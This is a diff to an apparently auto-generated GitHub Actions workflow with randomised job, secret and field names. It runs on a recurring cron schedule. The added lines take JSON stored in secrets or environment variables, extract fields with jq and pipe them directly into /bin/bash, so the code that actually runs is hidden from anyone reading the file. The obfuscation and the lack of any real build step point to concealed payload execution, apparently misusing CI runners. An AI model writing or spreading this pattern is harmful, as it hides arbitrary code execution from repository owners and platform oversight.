@@ -3,26 +3,22 @@ name: shenwansi4178
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 1/6 * * *'
-jobs:  # 24394
+    - cron: '10 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shenwansi4178
         env:
-          bkq3493: ${{ secrets.bkq3493 }}
+          nnbx678: ${{ secrets.nnbx678 }}
         run: |
-          echo $bkq3493 | jq -r .uyd5403 | /bin/bash
-          echo $ircnf1 | jq -r .hhsq6169 | /bin/bash
-          echo $oes8 | jq -r .rg028 | /bin/bash
-          echo $di9 | jq -r .nvpt64 | /bin/bash
-          echo $r5 | jq -r .rkk19651 | /bin/bash
-          echo $fmk81 | jq -r .uknz84 | /bin/bash
-          echo $xfho72 | jq -r .kdhv56 | /bin/bash
-          echo $xdnjn5 | jq -r .dthm8738 | /bin/bash
-          echo $stiiw24263 | jq -r .qgle33 | /bin/bash
-          echo $dodnv8314 | jq -r .dned7604 | /bin/bash
-          echo $dwl437 | jq -r .detdw23991 | /bin/bash
+          echo $nnbx678 | jq -r .w10 | /bin/bash
+          echo $jhi29 | jq -r .ksj00647 | /bin/bash
+          echo $rmgzz64 | jq -r .wxna307 | /bin/bash
+          echo $ircb9188 | jq -r .unxyp25026 | /bin/bash
+          echo $d20296 | jq -r .gekii1 | /bin/bash
+          echo $wpv217 | jq -r .agkk1420 | /bin/bash
+          echo $ec61771 | jq -r .udyl740 | /bin/bash
 
